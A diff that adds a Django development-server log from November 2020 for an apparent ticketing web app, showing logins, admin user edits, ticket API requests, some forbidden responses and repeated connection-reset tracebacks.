@@ -1,0 +1,1373 @@
+Watching for file changes with StatReloader
+[22/Nov/2020 04:47:29] "GET /login HTTP/1.1" 200 2613
+[22/Nov/2020 04:47:30] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 304 0
+[22/Nov/2020 04:47:30] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 304 0
+[22/Nov/2020 04:47:30] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 304 0
+[22/Nov/2020 04:47:30] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 304 0
+[22/Nov/2020 04:47:30] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 04:47:33] "POST /accounts/login/ HTTP/1.1" 200 17
+[22/Nov/2020 04:47:33] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1698
+[22/Nov/2020 04:47:33] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 04:47:50] "GET /admin/ HTTP/1.1" 200 6926
+[22/Nov/2020 04:47:51] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 04:47:53] "GET /admin/Ticket/ticket/ HTTP/1.1" 200 5405
+[22/Nov/2020 04:47:53] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[22/Nov/2020 04:47:53] "GET /admin/jsi18n/ HTTP/1.1" 200 3223
+[22/Nov/2020 04:47:53] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 04:47:55] "GET /admin/Ticket/ HTTP/1.1" 200 3333
+[22/Nov/2020 04:47:56] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
+[22/Nov/2020 04:47:56] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[22/Nov/2020 04:47:56] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[22/Nov/2020 04:47:56] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[22/Nov/2020 04:47:56] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[22/Nov/2020 04:47:56] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[22/Nov/2020 04:47:56] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[22/Nov/2020 04:47:56] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[22/Nov/2020 04:47:56] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 04:47:58] "GET /admin/ HTTP/1.1" 200 6926
+[22/Nov/2020 04:47:59] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 04:48:00] "GET /admin/auth/user/ HTTP/1.1" 200 7059
+[22/Nov/2020 04:48:00] "GET /admin/jsi18n/ HTTP/1.1" 200 3223
+[22/Nov/2020 04:48:00] "GET /static/admin/img/search.svg HTTP/1.1" 200 458
+[22/Nov/2020 04:48:01] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
+[22/Nov/2020 04:48:01] "GET /static/admin/img/sorting-icons.svg HTTP/1.1" 200 1097
+[22/Nov/2020 04:48:01] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 04:48:06] "GET /admin/auth/user/2/change/ HTTP/1.1" 200 14774
+[22/Nov/2020 04:48:07] "GET /static/admin/css/forms.css HTTP/1.1" 200 8518
+[22/Nov/2020 04:48:07] "GET /static/admin/js/calendar.js HTTP/1.1" 200 7777
+[22/Nov/2020 04:48:07] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 200 20218
+[22/Nov/2020 04:48:07] "GET /admin/jsi18n/ HTTP/1.1" 200 3223
+[22/Nov/2020 04:48:07] "GET /static/admin/js/SelectBox.js HTTP/1.1" 200 5753
+[22/Nov/2020 04:48:08] "GET /static/admin/js/SelectFilter2.js HTTP/1.1" 200 12322
+[22/Nov/2020 04:48:08] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10340
+----------------------------------------
+Exception happened during processing of request from ('106.207.235.112', 33925)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[22/Nov/2020 04:49:45] "GET /admin/auth/user/2/change/ HTTP/1.1" 200 14774
+[22/Nov/2020 04:49:46] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[22/Nov/2020 04:49:46] "GET /admin/jsi18n/ HTTP/1.1" 200 3223
+[22/Nov/2020 04:49:46] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10340
+[22/Nov/2020 04:49:46] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[22/Nov/2020 04:49:46] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[22/Nov/2020 04:49:46] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[22/Nov/2020 04:49:47] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[22/Nov/2020 04:49:47] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[22/Nov/2020 04:49:47] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[22/Nov/2020 04:49:47] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[22/Nov/2020 04:49:48] "GET /static/admin/js/change_form.js HTTP/1.1" 200 712
+[22/Nov/2020 04:49:48] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 495
+[22/Nov/2020 04:49:49] "GET /static/admin/img/icon-unknown.svg HTTP/1.1" 200 655
+[22/Nov/2020 04:49:49] "GET /static/admin/img/selector-icons.svg HTTP/1.1" 200 3291
+[22/Nov/2020 04:49:49] "GET /static/admin/img/icon-unknown-alt.svg HTTP/1.1" 200 655
+[22/Nov/2020 04:49:49] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 200 1086
+[22/Nov/2020 04:49:49] "GET /static/admin/img/icon-clock.svg HTTP/1.1" 200 677
+[22/Nov/2020 04:49:49] "GET /favicon.ico HTTP/1.1" 200 2612
+----------------------------------------
+Exception happened during processing of request from ('106.207.235.112', 33923)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('106.207.235.112', 33928)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[22/Nov/2020 04:50:10] "POST /admin/auth/user/2/change/ HTTP/1.1" 302 0
+[22/Nov/2020 04:50:12] "GET /admin/auth/user/ HTTP/1.1" 200 7229
+[22/Nov/2020 04:50:14] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
+[22/Nov/2020 04:50:14] "GET /admin/jsi18n/ HTTP/1.1" 200 3223
+[22/Nov/2020 04:50:14] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 304 0
+[22/Nov/2020 04:50:15] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 04:50:16] "GET /admin/auth/user/1/change/ HTTP/1.1" 200 14806
+[22/Nov/2020 04:50:16] "GET /admin/jsi18n/ HTTP/1.1" 200 3223
+[22/Nov/2020 04:50:17] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 04:50:23] "POST /admin/auth/user/1/change/ HTTP/1.1" 302 0
+[22/Nov/2020 04:50:24] "GET /admin/auth/user/ HTTP/1.1" 200 7195
+[22/Nov/2020 04:50:24] "GET /admin/jsi18n/ HTTP/1.1" 200 3223
+[22/Nov/2020 04:50:24] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 04:50:29] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 04:50:29] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 304 0
+[22/Nov/2020 04:50:30] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1698
+[22/Nov/2020 04:50:30] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 04:50:35] "GET /accounts/logout/ HTTP/1.1" 200 2
+[22/Nov/2020 04:50:35] "GET /favicon.ico HTTP/1.1" 200 2613
+----------------------------------------
+Exception happened during processing of request from ('106.207.235.112', 33922)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Unprocessable Entity: /accounts/login/
+[22/Nov/2020 04:50:37] "POST /accounts/login/ HTTP/1.1" 422 45
+[22/Nov/2020 04:50:48] "POST /accounts/login/ HTTP/1.1" 200 17
+[22/Nov/2020 04:50:48] "GET /tickets/tickets/?format=json HTTP/1.1" 200 373
+[22/Nov/2020 04:50:48] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 04:50:52] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 04:50:52] "GET /accounts/logout/ HTTP/1.1" 200 2
+[22/Nov/2020 04:50:59] "POST /accounts/login/ HTTP/1.1" 200 17
+[22/Nov/2020 04:50:59] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 04:51:00] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1698
+[22/Nov/2020 04:53:28] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 04:53:28] "GET /accounts/logout/ HTTP/1.1" 200 2
+[22/Nov/2020 04:54:09] "GET /admin/ HTTP/1.1" 302 0
+[22/Nov/2020 04:54:09] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1808
+[22/Nov/2020 04:54:09] "GET /static/admin/css/login.css HTTP/1.1" 200 1233
+[22/Nov/2020 04:54:09] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[22/Nov/2020 04:54:09] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[22/Nov/2020 04:54:10] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[22/Nov/2020 04:54:10] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[22/Nov/2020 04:54:10] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[22/Nov/2020 04:54:10] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 04:54:13] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[22/Nov/2020 04:54:13] "GET /admin/ HTTP/1.1" 200 7474
+[22/Nov/2020 04:54:14] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
+[22/Nov/2020 04:54:14] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[22/Nov/2020 04:54:14] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[22/Nov/2020 04:54:14] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[22/Nov/2020 04:54:14] "GET /favicon.ico HTTP/1.1" 200 2612
+----------------------------------------
+Exception happened during processing of request from ('162.142.125.37', 55542)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 169, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[22/Nov/2020 05:15:47] "GET / HTTP/1.1" 200 2613
+----------------------------------------
+Exception happened during processing of request from ('162.142.125.37', 57752)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[22/Nov/2020 05:15:47] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 05:16:23] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 05:16:23] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 200 888
+[22/Nov/2020 05:16:23] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 200 15437
+[22/Nov/2020 05:16:23] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 200 144728
+[22/Nov/2020 05:16:23] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 200 303393
+[22/Nov/2020 05:16:24] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 05:16:24] "GET /logo192.png HTTP/1.1" 200 2613
+[22/Nov/2020 05:16:35] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 05:16:36] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 200 888
+[22/Nov/2020 05:16:36] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 200 15437
+[22/Nov/2020 05:16:36] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 200 144728
+[22/Nov/2020 05:16:36] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 200 303393
+[22/Nov/2020 05:16:37] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 05:16:37] "GET /logo192.png HTTP/1.1" 200 2613
+[22/Nov/2020 05:16:43] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 05:16:44] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 05:16:44] "GET /logo192.png HTTP/1.1" 200 2613
+[22/Nov/2020 05:16:50] "POST /accounts/login/ HTTP/1.1" 200 17
+[22/Nov/2020 05:16:50] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:16:50] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1698
+[22/Nov/2020 05:16:50] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 05:16:57] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 05:16:57] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 05:16:57] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:16:57] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 05:16:57] "GET /tickets/fetch_ticket/10 HTTP/1.1" 200 319
+[22/Nov/2020 05:17:05] "GET /ticket_details/10 HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:05] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 05:17:05] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:05] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:05] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 05:17:05] "GET /tickets/fetch_ticket/10 HTTP/1.1" 200 319
+[22/Nov/2020 05:17:09] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1698
+[22/Nov/2020 05:17:09] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:09] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:11] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 05:17:11] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:11] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:11] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 05:17:11] "GET /tickets/fetch_ticket/5 HTTP/1.1" 200 374
+[22/Nov/2020 05:17:19] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:20] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1698
+[22/Nov/2020 05:17:20] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:20] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:24] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 05:17:24] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:24] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:25] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 05:17:25] "GET /tickets/fetch_ticket/6 HTTP/1.1" 200 402
+[22/Nov/2020 05:17:43] "POST /tickets/update_ticket/ HTTP/1.1" 201 16
+[22/Nov/2020 05:17:43] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:43] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:43] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1704
+[22/Nov/2020 05:17:45] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 05:17:45] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:45] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:45] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 05:17:45] "GET /tickets/fetch_ticket/6 HTTP/1.1" 200 408
+[22/Nov/2020 05:17:49] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:49] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:49] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1704
+[22/Nov/2020 05:17:50] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 05:17:50] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:50] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:50] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 05:17:50] "GET /tickets/fetch_ticket/7 HTTP/1.1" 200 358
+[22/Nov/2020 05:17:58] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1704
+[22/Nov/2020 05:17:58] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:17:58] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 05:19:38] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 05:19:39] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 05:19:39] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 05:19:44] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 200 888
+[22/Nov/2020 05:19:44] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 200 144728
+[22/Nov/2020 05:19:44] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 200 15437
+[22/Nov/2020 05:19:44] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 200 303393
+[22/Nov/2020 05:19:47] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 05:19:47] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 05:19:47] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 05:20:35] "POST /accounts/login/ HTTP/1.1" 200 17
+[22/Nov/2020 05:20:35] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:20:36] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1704
+[22/Nov/2020 05:20:42] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 05:20:42] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:20:43] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 05:20:43] "GET /tickets/fetch_ticket/6 HTTP/1.1" 200 408
+Forbidden: /tickets/update_ticket/
+[22/Nov/2020 05:20:48] "POST /tickets/update_ticket/ HTTP/1.1" 403 58
+[22/Nov/2020 05:20:53] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:20:53] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1704
+[22/Nov/2020 05:20:56] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 05:20:56] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:20:56] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+Forbidden: /tickets/add_ticket/
+[22/Nov/2020 05:21:01] "POST /tickets/add_ticket/ HTTP/1.1" 403 58
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+[22/Nov/2020 05:21:07] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:21:08] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1704
+[22/Nov/2020 05:21:13] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:21:13] "GET /accounts/logout/ HTTP/1.1" 200 2
+----------------------------------------
+Exception happened during processing of request from ('49.36.39.95', 41255)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('49.36.39.95', 41261)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('49.36.39.95', 41259)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('49.36.39.95', 41257)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[22/Nov/2020 05:31:15] "GET /tickets HTTP/1.1" 200 2612
+[22/Nov/2020 05:31:16] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 05:31:16] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 05:55:13] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 06:44:16] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 06:44:16] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 304 0
+[22/Nov/2020 06:44:16] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 304 0
+[22/Nov/2020 06:44:16] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 304 0
+[22/Nov/2020 06:44:16] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 304 0
+[22/Nov/2020 06:44:16] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1704
+[22/Nov/2020 06:44:16] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 07:06:32] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 07:06:32] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 304 0
+[22/Nov/2020 07:06:32] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 304 0
+[22/Nov/2020 07:06:32] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 304 0
+[22/Nov/2020 07:06:32] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 304 0
+[22/Nov/2020 07:06:33] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1704
+[22/Nov/2020 07:06:33] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 07:09:53] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 07:09:53] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1704
+[22/Nov/2020 07:09:53] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 07:11:27] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 07:11:27] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1704
+[22/Nov/2020 07:11:28] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 07:12:33] "GET /manifest.json HTTP/1.1" 200 2613
+[22/Nov/2020 07:12:33] "GET /static/js/2.a86bbe9a.chunk.js.map HTTP/1.1" 304 0
+[22/Nov/2020 07:12:33] "GET /static/js/main.a13d1d8f.chunk.js.map HTTP/1.1" 200 30830
